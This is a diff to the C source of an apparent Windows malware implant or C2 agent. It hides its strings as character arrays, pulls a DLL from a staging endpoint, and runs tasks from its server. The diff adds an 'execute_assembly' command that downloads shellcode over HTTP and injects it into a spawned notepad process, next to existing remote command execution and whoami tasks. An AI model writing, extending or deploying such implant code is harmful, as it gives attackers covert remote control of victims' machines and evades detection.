@@ -261,9 +261,10 @@ void myMain()
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
+    WCHAR wcStageEndpoint[] = { 's', 't', 'a', 'g', 'e', 0 };
     while (pEsgStdDll->Buffer == NULL)
     {
-        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size);
+        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint);
         ((SLEEP)api->Sleep)(5000);
         if (pEsgStdDll->Buffer != NULL)
         { break; }
@@ -279,9 +280,11 @@ void myMain()
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
+    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, runCmd_c);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, whoami_c);
+    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, injectIntoProcess_c);
 
     //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
@@ -299,7 +302,7 @@ void myMain()
     CHAR* agentUuid = { 0 };
     CHAR* b64Task;
     CHAR* task = NULL;
-    CHAR* orgOutput;
+    CHAR* orgOutput = NULL;
     DWORD taskSize;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
@@ -364,6 +367,7 @@ void myMain()
         CHAR cmd[] = { 'c', 'm', 'd', 0 };
         CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
         CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
+        CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
         if (my_strcmp(taskType, cmd) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
@@ -384,7 +388,9 @@ void myMain()
             PostRequest(api, wServer, port, fullPath2, json);
 
             if (pEsgStdDll->Buffer)
-            { ((FREE)api->free)(pEsgStdDll->Buffer); }
+            {
+                ((FREE)api->free)(pEsgStdDll->Buffer);
+            }
             if (json)
             {
                 ((FREE)api->free)(json);
@@ -395,6 +401,15 @@ void myMain()
             }
 
             ((EXITTHREAD)api->ExitThread)(0);
+        }
+        else if (my_strcmp(taskType, executeAssembly) == 0)
+        {
+            CHAR lpApplicationName[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', 0 };
+            DWORD dwShellcodeSize;
+            WCHAR cAssemblyEndpoint[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
+            LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
+            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, lpApplicationName);
+            CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
         }
         else
         {
